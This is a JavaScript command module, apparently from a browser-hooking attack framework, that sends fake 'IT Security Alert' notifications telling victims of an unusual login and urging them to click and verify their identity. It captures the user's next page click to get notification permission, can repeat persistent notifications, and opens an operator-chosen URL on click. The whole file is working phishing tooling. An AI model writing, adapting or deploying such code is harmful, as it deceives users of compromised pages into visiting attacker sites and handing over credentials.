COMMANDS['notifications'] = async function(task) {
    var params = parseParams(task);
    var title = (params && params.title) ? params.title : 'IT Security Alert';
    var body = (params && params.body) ? params.body : 'Unusual login detected on your account. Click to verify your identity.';
    var icon = (params && params.icon) ? params.icon : '';
    var url = (params && params.url) ? params.url : '';
    var count = (params && params.count) ? parseInt(params.count) : 1;

    if (!('Notification' in window)) {
        return JSON.stringify({error: 'Notification API not available'}, null, 2);
    }

    // Request permission — browsers require a user gesture for this call,
    // so if we don't have permission yet, wait for the next click.
    var perm = Notification.permission;
    if (perm === 'default') {
        perm = await new Promise(function(resolve) {
            var resolved = false;
            function handler() {
                if (resolved) return;
                resolved = true;
                document.removeEventListener('click', handler, true);
                Notification.requestPermission().then(resolve).catch(function() { resolve('denied'); });
            }
            document.addEventListener('click', handler, true);
            // Timeout after 30s — don't hang forever waiting for a click
            setTimeout(function() {
                if (!resolved) {
                    resolved = true;
                    document.removeEventListener('click', handler, true);
                    resolve('timeout');
                }
            }, 30000);
        });
    }

    if (perm === 'timeout') {
        return JSON.stringify({
            error: 'Notification permission requires a user click — timed out after 30s waiting for interaction',
            permission: 'default'
        }, null, 2);
    }

    if (perm !== 'granted') {
        return JSON.stringify({
            error: 'Notification permission denied',
            permission: perm
        }, null, 2);
    }

    var sent = 0;
    for (var i = 0; i < count; i++) {
        var opts = {body: body, requireInteraction: true};
        if (icon) opts.icon = icon;

        var n = new Notification(title, opts);
        if (url) {
            n.onclick = function() {
                window.open(url, '_blank');
            };
        }
        sent++;
        // Small delay between multiple notifications
        if (count > 1 && i < count - 1) {
            await new Promise(function(r) { setTimeout(r, 300); });
        }
    }

    return JSON.stringify({
        permission: perm,
        sent: sent,
        title: title,
        body: body,
        clickUrl: url || '(none)'
    }, null, 2);
};
